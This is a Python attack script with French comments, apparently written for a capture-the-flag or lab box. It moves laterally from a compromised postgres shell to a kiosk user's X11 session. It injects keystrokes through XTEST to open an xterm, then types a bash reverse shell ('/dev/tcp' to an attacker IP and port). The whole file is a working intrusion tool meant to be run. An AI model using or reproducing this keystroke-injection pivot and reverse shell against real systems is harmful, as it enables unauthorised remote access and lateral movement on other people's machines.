#!/usr/bin/env python3
"""
Pivot postgres -> dutyfree-kiosk via X11/XTEST.
Ouvre un xterm sur :0 (keybind Openbox Ctrl+Alt+T) puis tape un reverse shell.
A lancer DEPUIS la box (shell postgres), apres avoir trouve DISPLAY/XAUTHORITY.

  export DISPLAY=:0
  export XAUTHORITY=/home/dutyfree-kiosk/.Xauthority
  python3 xtest_pivot.py 10.10.14.158 443

Prerequis : python3-xlib (import Xlib). Sinon -> xdotool / xte.
"""
import sys, time, os
from Xlib import display, X
from Xlib.ext import xtest

LHOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.14.158"
LPORT = sys.argv[2] if len(sys.argv) > 2 else "443"
CMD = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"

d = display.Display()           # lit DISPLAY + XAUTHORITY depuis l'env

def key(keycode, down):
    xtest.fake_input(d, X.KeyPress if down else X.KeyRelease, keycode)
    d.sync()

def tap(keysym, shift=False):
    kc = d.keysym_to_keycode(keysym)
    sc = d.keysym_to_keycode(0xffe1)       # Shift_L
    if shift: key(sc, True)
    key(kc, True); key(kc, False)
    if shift: key(sc, False)
    time.sleep(0.03)

def type_string(s):
    for ch in s:
        ks = ord(ch)                        # ASCII imprimable : keysym == codepoint
        kc = d.keysym_to_keycode(ks)
        # shift necessaire si notre keysym est la version "shiftee" de la touche
        need_shift = (d.keycode_to_keysym(kc, 0) != ks and
                      d.keycode_to_keysym(kc, 1) == ks)
        tap(ks, shift=need_shift)

# 1) Ctrl+Alt+T -> xterm (en tant que dutyfree-kiosk)
ctrl, alt, t = 0xffe3, 0xffe9, ord('t')     # Control_L, Alt_L, t
kc_ctrl, kc_alt, kc_t = (d.keysym_to_keycode(k) for k in (ctrl, alt, t))
key(kc_ctrl, True); key(kc_alt, True); key(kc_t, True)
key(kc_t, False); key(kc_alt, False); key(kc_ctrl, False)
d.sync()

time.sleep(1.5)                             # laisse xterm s'ouvrir et prendre le focus

# 2) tape la commande + Entree
type_string(CMD)
tap(0xff0d)                                 # Return
print("[+] envoye :", CMD)
